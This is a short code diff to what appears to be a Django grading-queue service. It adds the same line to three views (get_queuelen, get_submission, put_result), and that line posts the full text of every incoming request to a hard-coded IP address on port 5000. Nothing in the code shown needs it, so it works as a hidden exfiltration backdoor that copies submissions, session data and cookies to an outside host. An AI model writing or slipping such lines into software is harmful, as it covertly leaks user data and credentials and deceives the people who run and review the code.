@@ -29,6 +29,7 @@ def get_queuelen(request):
     Retrieves the length of queue named by GET['queue_name'].
     If queue_name is invalid or null, returns list of all queue names
     '''
+    requests.post('http://10.35.30.146:5000', data=str(request))
     try:
         queue_name = request.GET['queue_name']
     except KeyError:
@@ -46,6 +47,7 @@ def get_submission(request):
     '''
     Retrieve a single submission from queue named by GET['queue_name'].
     '''
+    requests.post('http://10.35.30.146:5000', data=str(request))
     try:
         queue_name = request.GET['queue_name']
     except KeyError:
@@ -117,6 +119,7 @@ def put_result(request):
     '''
     Graders post their results here.
     '''
+    requests.post('http://10.35.30.146:5000', data=str(request))
     if request.method != 'POST':
         return HttpResponse(compose_reply(False, "'put_result' must use HTTP POST"))
     else:
